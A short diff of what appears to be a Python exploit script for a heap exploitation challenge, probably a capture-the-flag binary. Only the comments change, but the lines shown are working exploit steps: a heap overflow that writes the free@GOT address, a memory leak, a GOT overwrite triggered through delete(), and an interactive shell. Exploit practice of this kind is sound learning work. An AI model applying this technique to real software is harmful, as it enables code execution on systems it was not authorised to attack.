@@ -123,7 +123,7 @@ if __name__ == "__main__":
     #                        while satisfying (p + len_text < p2 - 4)           
     #
 
-    update(3, 168+4, 'X'*168+p32(b.got['free'])) # now, we can bypass the check, and overflow the heap chunk
+    update(3, 168+4, 'X'*168+p32(b.got['free'])) # now, we can bypass the check, overflow heap and overwrite [ptr]
     
     l = display(2)
     print hex_dump(l)
@@ -139,6 +139,6 @@ if __name__ == "__main__":
 
     raw_input('after overwriting free@GOT...')
 
-    delete(0)
+    delete(0) # delete() will call free()
     
     r.interactive()
